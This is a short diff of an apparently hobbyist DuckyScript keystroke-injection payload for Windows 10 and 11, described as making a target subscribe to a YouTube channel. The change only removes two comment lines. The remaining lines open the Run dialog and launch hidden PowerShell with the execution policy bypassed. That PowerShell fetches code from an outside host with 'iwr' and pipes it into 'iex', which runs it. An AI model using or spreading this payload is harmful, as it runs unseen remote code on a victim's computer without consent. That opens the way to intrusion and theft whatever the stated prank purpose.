@@ -6,9 +6,6 @@ REM     Description: This payload is meant to make your target subscribe to your
 
 REM     Target: Windows 10, 11
 
-REM     Remember to replace the link with your link for the intended file to download
-REM     Also remember to replace the URL with your own
-
 GUI r
 DELAY 500
 STRING powershell -w h -NoP -Ep Bypass $channel='youtube.com/iamjakoby';iwr jakoby.lol/wj4 | iex
